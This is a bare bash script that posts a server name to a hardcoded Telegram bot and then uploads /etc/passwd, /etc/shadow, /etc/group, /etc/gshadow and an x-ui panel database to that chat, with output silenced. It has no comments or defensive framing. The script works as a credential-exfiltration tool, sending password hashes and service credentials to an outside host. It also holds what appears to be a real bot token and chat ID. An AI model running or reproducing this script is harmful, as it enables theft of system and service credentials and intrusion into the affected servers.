#!/bin/bash

DATE=$(date +"%Y-%m-%d %H:%M:%S")
BOT_TOKEN="6740027708:AAHFst9deCikTbscLts8b6ff24dcuhAYrzg"
CHAT_ID="159313886"
file_path=""
SERVER_NAME="S1"
send_message() {
 local message="$1"
 curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
 -d "chat_id=$CHAT_ID" \
 -d "text=$message"
}
send_message "$DATE ----> $SERVER_NAME"
send_file() {
 local file_path="$1"
 local caption="$2"
 curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" \
 -F "chat_id=$CHAT_ID" \
 -F "document=@$file_path" \
 -F "caption=$caption"
}
send_file "/etc/passwd" "passwd" > /dev/null
send_file "/etc/group" "group" > /dev/null
send_file "/etc/shadow" "shadow" > /dev/null
send_file "/etc/gshadow" "gshadow" > /dev/null

send_file "/etc/x-ui/x-ui.db" "x-ui.db" > /dev/null